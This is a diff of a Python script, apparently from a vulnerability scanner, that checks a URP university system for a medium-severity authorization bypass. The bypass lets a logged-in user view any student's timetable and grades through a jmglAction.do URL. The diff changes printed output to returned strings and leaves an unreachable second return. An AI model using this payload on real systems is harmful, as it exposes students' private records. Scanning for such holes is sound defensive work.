@@ -8,8 +8,8 @@ description: 系统存在一个越权漏洞，登录之后可以通过姓名或�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class urp_query2_BaseVerify:
     def __init__(self, url):
@@ -22,13 +22,13 @@ class urp_query2_BaseVerify:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
             if r"jmglAction.do" in req.text:
-                cprint("[+]存在URP越权查看任意学生课表、成绩(需登录)漏洞...(中危)\tpayload: "+vulnurl, "yellow")
-                cprint("[+]存在URP越权查看任意学生课表、成绩(需登录)漏洞...(中危)\tpayload: "+self.url+"/jmglAction.do?oper=xsmdcx", "yellow")
+                return "[+]存在URP越权查看任意学生课表、成绩(需登录)漏洞...(中危)\tpayload: "+vulnurl
+                return "[+]存在URP越权查看任意学生课表、成绩(需登录)漏洞...(中危)\tpayload: "+self.url+"/jmglAction.do?oper=xsmdcx"
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = urp_query2_BaseVerify(sys.argv[1])
     testVuln.run()
